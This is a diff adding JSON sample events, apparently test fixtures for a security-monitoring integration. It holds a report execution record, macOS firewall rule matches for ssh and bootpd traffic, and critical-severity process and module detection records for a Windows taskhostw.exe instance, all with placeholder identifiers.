+      "ReportID": "68b329da9893e34099c7d8ad5cb9c940",
+      "ReportName": "HTTP Request With Empty User Agent",
+      "ReportType": "event_search",
+      "ReportFileReference": "/reports/entities/report-executions-download/v1?ids=68b329da9893e34099c7d8ad5cb9c940",
+      "Status": 1,
+      "StatusMessage": "",
+      "ExecutionMetadata": {
+        "ExecutionStart": 1719291608000,
+        "ExecutionDuration": 226,
+        "ReportFileName": "HTTP_Request_With_Empty_User_Agent_2024_June_25_506_467709.json",
+        "ResultCount": 0,
+        "ResultID": "11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111",
+        "SearchWindowStart": 1719284400000,
+        "SearchWindowEnd": 1719291600000
+      }
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "0123456789ABCDEFGHIJKLMNOPQRSTUV",
+      "offset": 741510,
+      "eventType": "FirewallMatchEvent",
+      "eventCreationTime": 1763631340000,
+      "version": "1.0"
+    },
+    "event": {
+      "DeviceId": "11111111111111111111111111111111",
+      "CustomerId": "0123456789ABCDEFGHIJKLMNOPQRSTUV",
+      "Ipv": "ipv4",
+      "CommandLine": "/usr/bin/ssh git@git.example.org git-receive-pack something/core/apps/test-integration.git",
+      "ConnectionDirection": "0",
+      "EventType": "FirewallRuleIP4Matched",
+      "Flags": {
+        "Audit": false,
+        "Log": true,
+        "Monitor": true
+      },
+      "HostName": "EXAMPLE",
+      "ICMPCode": "",
+      "ICMPType": "",
+      "ImageFileName": "/usr/bin/ssh",
+      "LocalAddress": "0.0.0.0",
+      "LocalPort": "0",
+      "MatchCount": 1,
+      "MatchCountSinceLastReport": 1,
+      "NetworkProfile": "255",
+      "PID": "333333333333333333",
+      "PolicyName": "Smth - Firewall ON",
+      "PolicyID": "44444444444444444444444444444444",
+      "Protocol": "6",
+      "RemoteAddress": "192.0.2.10",
+      "RemotePort": "22",
+      "RuleAction": "2",
+      "RuleDescription": "",
+      "RuleFamilyID": "55555555555555555555555555555555",
+      "RuleGroupName": "Something - Block rules",
+      "RuleName": "Smth - Block SSH connections",
+      "RuleId": "6666666666666666666",
+      "Status": "",
+      "Timestamp": "2025-11-20T09:35:38Z",
+      "TreeID": "",
+      "Platform": "mac"
+    }
+  },
+  {
+    "metadata": {
+      "customerIDString": "0123456789ABCDEFGHIJKLMNOPQRSTUV",
+      "offset": 759800,
+      "eventType": "FirewallMatchEvent",
+      "eventCreationTime": 1764340622000,
+      "version": "1.0"
+    },
+    "event": {
+      "DeviceId": "11111111111111111111111111111111",
+      "CustomerId": "0123456789ABCDEFGHIJKLMNOPQRSTUV",
+      "Ipv": "ipv4",
+      "CommandLine": "/usr/libexec/bootpd",
+      "ConnectionDirection": "1",
+      "EventType": "FirewallRuleIP4Matched",
+      "Flags": {
+        "Audit": false,
+        "Log": true,
+        "Monitor": true
+      },
+      "HostName": "EXAMPLE",
+      "ICMPCode": "",
+      "ICMPType": "",
+      "ImageFileName": "/usr/libexec/bootpd",
+      "LocalAddress": "255.255.255.255",
+      "LocalPort": "67",
+      "MatchCount": 1,
+      "MatchCountSinceLastReport": 1,
+      "NetworkProfile": "255",
+      "PID": "111111111111111111",
+      "PolicyName": "Smth - Firewall ON",
+      "PolicyID": "22222222222222222222222222222222",
+      "Protocol": "17",
+      "RemoteAddress": "192.0.2.10",
+      "RemotePort": "64722",
+      "RuleAction": "2",
+      "RuleDescription": "",
+      "RuleFamilyID": "3333333333333333333333333333333",
+      "RuleGroupName": "Something - Block rules",
+      "RuleName": "Smth - Block Inbound connections",
+      "RuleId": "4444444444444444444",
+      "Status": "",
+      "Timestamp": "2025-11-28T14:37:01Z",
+      "TreeID": "",
+      "Platform": "mac"
+    }
+  },
+  {
+    "metadata": {
+      "detectionIdString": "ldt:9ed90be65f99456c9361141f8cfa39ab:17212155109",
+      "eventType": "Vertex",
+      "edge": {
+        "sourceVertexId": "pid:9ed90be65f99456c9361141f8cfa39ab:17326818154",
+        "type": "child_process"
+      },
+      "severity": {
+        "name": "Critical",
+        "code": 5
+      }
+    },
+    "event": {
+      "id": "pid:f0e3fbf905c14b88adb500a495f9292f:123456789",
+      "customer_id": "5d505aca55a145b3bd234c399201f082",
+      "scope": "device",
+      "object_id": "00000000-0000-0000-0000-000000000000",
+      "device_id": "9ed90be65f99456c9361141f8cfa39ab",
+      "vertex_type": "process",
+      "timestamp": "2022-07-30T20:22:29Z",
+      "properties": {
+        "AllocateVirtualMemoryCount": "0",
+        "ArchiveFileWrittenCount": "0",
+        "AsepWrittenCount": "0",
+        "AuthenticationId": "55555555",
+        "BinaryExecutableWrittenCount": "0",
+        "CLICreationCount": "0",
+        "CommandLine": "taskhostw.exe Install $(Arg0)",
+        "ConHostId": "856",
+        "ConHostProcessId": "58913928",
+        "ConfigBuild": "1007.3.0015316.10",
+        "ConfigStateHash": "2146686153",
+        "ContextProcessId": "8322695771",
+        "ContextThreadId": "409412655947",
+        "CycleTime": "224272919",
+        "DirectoryCreatedCount": "0",
+        "DirectoryEnumeratedCount": "0",
+        "DnsRequestCount": "0",
+        "DocumentFileWrittenCount": "0",
+        "ExeAndServiceCount": "0",
+        "ExecutableDeletedCount": "0",
+        "ExitCode": "0",
+        "FileDeletedCount": "0",
+        "GenericFileWrittenCount": "0",
+        "ImageFileName": "\\Device\\HarddiskVolume2\\Windows\\System32\\taskhostw.exe",
+        "ImageSubsystem": "2",
+        "InjectedDllCount": "0",
+        "InjectedThreadCount": "0",
+        "IntegrityLevel": "8192",
+        "KernelTime": "468750",
+        "MaxThreadCount": "8",
+        "ModuleLoadCount": "25",
+        "NetworkBindCount": "0",
+        "NetworkCapableAsepWriteCount": "0",
+        "NetworkCloseCount": "0",
+        "NetworkConnectCount": "0",
+        "NetworkConnectCountUdp": "0",
+        "NetworkListenCount": "0",
+        "NetworkModuleLoadCount": "0",
+        "NetworkRecvAcceptCount": "0",
+        "NewExecutableWrittenCount": "0",
+        "ParentAuthenticationId": "81349050",
+        "ParentProcessId": "58913928",
+        "PrivilegedProcessHandleCount": "0",
+        "ProcessCreateFlags": "525316",
+        "ProcessEndTime": "133027667380241770",
+        "ProcessEndTime_formatted": "2022-07-20T04:58:58.024177Z",
+        "ProcessParameterFlags": "24577",
+        "ProcessStartTime": "133027667360825182",
+        "ProcessStartTime_formatted": "2022-07-20T04:58:56.082518Z",
+        "ProcessSxsFlags": "64",
+        "ProtectVirtualMemoryCount": "0",
+        "QueueApcCount": "0",
+        "RawProcessId": "14264",
+        "RegKeySecurityDecreasedCount": "0",
+        "RemovableDiskFileWrittenCount": "0",
+        "RunDllInvocationCount": "0",
+        "SHA256HashData": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
+        "ScreenshotsTakenCount": "0",
+        "ScriptEngineInvocationCount": "0",
+        "ServiceEventCount": "0",
+        "SessionId": "5",
+        "SetThreadContextCount": "0",
+        "SnapshotFileOpenCount": "0",
+        "SourceProcessId": "58913928",
+        "SourceThreadId": "409387743461",
+        "SuspectStackCount": "0",
+        "SuspiciousCredentialModuleLoadCount": "0",
+        "SuspiciousDnsRequestCount": "0",
+        "SuspiciousFontLoadCount": "0",
+        "SuspiciousRawDiskReadCount": "0",
+        "Tags": "41, 53, 54, 55, 151, 874, 924, 12094627905582, 12094627906234",
+        "TokenType": "2",
+        "UnsignedModuleLoadCount": "0",
+        "UserMemoryAllocateExecutableCount": "0",
+        "UserMemoryAllocateExecutableRemoteCount": "0",
+        "UserMemoryProtectExecutableCount": "0",
+        "UserMemoryProtectExecutableRemoteCount": "0",
+        "UserSid": "S-1-0-0",
+        "UserSidHex": "0000000000000000",
+        "UserTime": "312500",
+        "WindowFlags": "128",
+        "WindowTitle": "C:\\Windows\\system32\\taskhostw.exe",
+        "platform": "0",
+        "processTerminated": "true"
+      }
+    }
+  },
+  {
+    "metadata": {
+      "detectionIdString": "ldt:9ed90be65f99456c9361141f8cfa39ab:17212155109",
+      "eventType": "Vertex",
+      "edge": {
+        "sourceVertexId": "pid:9ed90be65f99456c9361141f8cfa39ab:17326818154",
+        "type": "primary_module"
+      },
+      "severity": {
+        "name": "Critical",
+        "code": 5
+      }
+    },
+    "event": {
+      "customer_id": "5d505aca55a145b3bd234c399201f082",
+      "device_id": "9ed90be65f99456c9361141f8cfa39ab",
+      "id": "mod:9ed90be65f99456c9361141f8cfa39ab:01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
+      "object_id": "00000000-0000-0000-0000-000000000000",
+      "properties": {
+        "MD5HashData": "68b329da9893e34099c7d8ad5cb9c940",
+        "SHA1HashData": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
+        "SHA256HashData": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
+        "TargetProcessId": "26229308171"
+      },
+      "scope": "device",
+      "timestamp": "2022-07-30T20:32:53Z",
+      "vertex_type": "module"
+    }
+  }
+]
